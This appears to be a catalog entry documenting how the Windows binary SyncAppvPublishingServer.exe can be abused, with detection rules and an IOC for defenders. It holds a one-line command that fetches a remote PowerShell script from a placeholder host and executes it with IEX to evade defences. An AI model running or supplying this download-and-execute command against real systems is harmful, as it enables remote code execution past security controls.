---
Name: SyncAppvPublishingServer.exe
Description: Used by App-v to get App-v server lists
Author: 'Oddvar Moe'
Created: 2018-05-25
Commands:
  - Command: SyncAppvPublishingServer.exe "n;(New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') | IEX"
    Description: Example command on how inject Powershell code into the process
    Usecase: Use SyncAppvPublishingServer as a Powershell host to execute Powershell code. Evade defensive counter measures
    Category: Execute
    Privileges: User
    MitreID: T1218
    OperatingSystem: Windows 10 1709, Windows 10 1703, Windows 10 1607
Full_Path:
  - Path: C:\Windows\System32\SyncAppvPublishingServer.exe
  - Path: C:\Windows\SysWOW64\SyncAppvPublishingServer.exe
Code_Sample:
  - Code:
Detection:
  - Sigma: https://github.com/SigmaHQ/sigma/blob/fb750721b25ec4573acc32a0822d047a8ecdf269/rules/windows/deprecated/powershell_syncappvpublishingserver_exe.yml
  - Sigma: https://github.com/SigmaHQ/sigma/blob/fb750721b25ec4573acc32a0822d047a8ecdf269/rules/windows/deprecated/process_creation_syncappvpublishingserver_exe.yml
  - IOC: SyncAppvPublishingServer.exe should never be in use unless App-V is deployed
Resources:
  - Link: https://twitter.com/monoxgas/status/895045566090010624
Acknowledgement:
  - Person: Nick Landers
    Handle: '@monoxgas'
---
